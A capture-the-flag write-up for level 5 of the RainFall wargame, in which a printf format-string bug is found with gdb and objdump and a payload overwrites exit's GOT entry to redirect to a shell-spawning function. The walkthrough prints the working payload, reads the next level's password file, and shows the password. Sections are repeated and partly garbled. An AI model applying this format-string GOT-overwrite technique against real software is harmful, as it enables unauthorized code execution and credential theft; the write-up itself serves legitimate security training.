### level 5

we have this :

```bash
level5@RainFall:~$ ls
level5
level5@RainFall:~$ ./level5 
adcd
adcd
level5@RainFall:~$ gdb -q ./level5 
Reading symbols from /home/user/level5/level5...(no debugging symbols found)...done.
(gdb) b main
Breakpoint 1 at 0x8048507
(gdb) disas main
Dump of assembler code for function main:
   0x08048504 <+0>:	push   %ebp
   0x08048505 <+1>:	mov    %esp,%ebp
   0x08048507 <+3>:	and    $0xfffffff0,%esp
   0x0804850a <+6>:	call   0x80484c2 <n> # call function n 
   0x0804850f <+11>:	leave  
   0x08048510 <+12>:	ret    
End of assembler dump.
(gdb) disas n 
Dump of assembler code for function n:
   0x080484c2 <+0>:	push   %ebp
   0x080484c3 <+1>:	mov    %esp,%ebp
   0x080484c5 <+3>:	sub    $0x218,%esp # 512 bytes to read via fgets
   0x080484cb <+9>:	mov    0x8049848,%eax
   0x080484d0 <+14>:	mov    %eax,0x8(%esp)
   0x080484d4 <+18>:	movl   $0x200,0x4(%esp)
   0x080484dc <+26>:	lea    -0x208(%ebp),%eax
   0x080484e2 <+32>:	mov    %eax,(%esp)
   0x080484e5 <+35>:	call   0x80483a0 <fgets@plt>
   0x080484ea <+40>:	lea    -0x208(%ebp),%eax
   0x080484f0 <+46>:	mov    %eax,(%esp)
   0x080484f3 <+49>:	call   0x8048380 <printf@plt>
   0x080484f8 <+54>:	movl   $0x1,(%esp)

(gdb) info function 
All defined functions:

Non-debugging symbols:
0x08048334  _init
0x08048380  printf
0x08048380  printf@plt
0x08048390  _exit
0x08048390  _exit@plt
0x080483a0  fgets
0x080483a0  fgets@plt
0x080483b0  system
0x080483b0  system@plt
0x080483c0  __gmon_start__
0x080483c0  __gmon_start__@plt
0x080483d0  exit
0x080483d0  exit@plt
0x080483e0  __libc_start_main
0x080483e0  __libc_start_main@plt
0x080483f0  _start
0x08048420  __do_global_dtors_aux
0x08048480  frame_dummy
0x080484a4  o  # this function is not called in the main and n 
0x080484c2  n
0x08048504  main
0x08048520  __libc_csu_init
0x08048590  __libc_csu_fini
0x08048592  __i686.get_pc_thunk.bx
0x080485a0  __do_global_ctors_aux
0x080485cc  _fini
0xb7fde7c0  __libc_memalign
0xb7fde7c0  __libc_memalign@plt
0xb7fde7d0  malloc
0xb7fde7d0  malloc@plt
0xb7fde7e0  calloc
0xb7fde7e0  calloc@plt
0xb7fde7f0  realloc
0xb7fde7f0  realloc@plt
0xb7fde800  ___tls_get_addr
0xb7fde800  ___tls_get_addr@plt
0xb7fde810  free
0xb7fde810  free@plt
0xb7fe6b30  _dl_rtld_di_serinfo
0xb7fed670  _dl_debug_state

level5@RainFall:~$ gdb -q ./level5 
Reading symbols from /home/user/level5/level5...(no debugging symbols found)...done.
(gdb) b main
Breakpoint 1 at 0x8048507
(gdb) disas main
Dump of assembler code for function main:
   0x08048504 <+0>:	push   %ebp
   0x08048505 <+1>:	mov    %esp,%ebp
   0x08048507 <+3>:	and    $0xfffffff0,%esp
   0x0804850a <+6>:	call   0x80484c2 <n> # call function n 
   0x0804850f <+11>:	leave  
   0x08048510 <+12>:	ret    
End of assembler dump.
(gdb) disas n 
Dump of assembler code for function n:
   0x080484c2 <+0>:	push   %ebp
   0x080484c3 <+1>:	mov    %esp,%ebp
   0x080484c5 <+3>:	sub    $0x218,%esp # 512 bytes to read via fgets
   0x080484cb <+9>:	mov    0x8049848,%eax
   0x080484d0 <+14>:	mov    %eax,0x8(%esp)
   0x080484d4 <+18>:	movl   $0x200,0x4(%esp)
   0x080484dc <+26>:	lea    -0x208(%ebp),%eax
   0x080484e2 <+32>:	mov    %eax,(%esp)
   0x080484e5 <+35>:	call   0x80483a0 <fgets@plt>
   0x080484ea <+40>:	lea    -0x208(%ebp),%eax
   0x080484f0 <+46>:	mov    %eax,(%esp)
   0x080484f3 <+49>:	call   0x8048380 <printf@plt>
   0x080484f8 <+54>:	movl   $0x1,(%esp)
   0x080484ff <+61>:	call   0x80483d0 <exit@plt>
End of assembler dump.

int this case we have no global variable to overwrite or something like 




(gdb) b system 
Breakpoint 2 at 0x80483b0
(gdb) find system,+999999999,"/bin/sh"
0xb7f8cc58
warning: Unable to access target memory at 0xb7fd3160, halting search.
lets  check the exit :



level5@RainFall:~$ objdump -R ./level5 | grep exit
08049828 R_386_JUMP_SLOT   _exit
08049838 R_386_JUMP_SLOT   exit
the offset:



 python -c 'print("AAAA" + "%p "*20)' | ./level5 
AAAA0x200 0xb7fd1ac0 0xb7ff37d0 0x41414141 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0xa
   0x080484ff <+61>:	call   0x80483d0 <exit@plt>
End of assembler dump.
```

int this case we have no global variable to overwrite or something like

```bash
(gdb) b system 
Breakpoint 2 at 0x80483b0
(gdb) find system,+999999999,"/bin/sh"
0xb7f8cc58
warning: Unable to access target memory at 0xb7fd3160, halting search.
```

lets  check the exit :

```bash
level5@RainFall:~$ objdump -R ./level5 | grep exit
08049828 R_386_JUMP_SLOT   _exit
08049838 R_386_JUMP_SLOT   exit
```

the offset:

```bash
 python -c 'print("AAAA" + "%p "*20)' | ./level5 
AAAA0x200 0xb7fd1ac0 0xb7ff37d0 0x41414141 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0xa
```

when get to the exit function lets try to pass system 

```bash
(gdb) run < <(python -c 'print("\x38\x98\x04\x08%134513580x%4$n")')
Breakpoint 1, 0x080484f8 in n ()
(gdb) x/xw 0x08049838
0x8049838 <exit@got.plt>:	0x080483b0
```

the direct use of the system with /bin/sh as args wont work , i had to pass the o() function 

```bash
level5@RainFall:\~$ python -c "print '\\x08\\x04\\x98\\x38'\[::-1\] + '%134513824d' + '%4$n'" >> /tmp/file 
level5@RainFall:\~$ cat /tmp/file - | ./level5

or just :

level5@RainFall:\~$  (python -c "print '\x38\x98\x04\x08' + '%134513824d' + '%4\$n'"; cat -) | ./level5


whoami
level6
cat /home/user/level6/.pass
d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31

```

- The - after cat maintains stdin open for shell interaction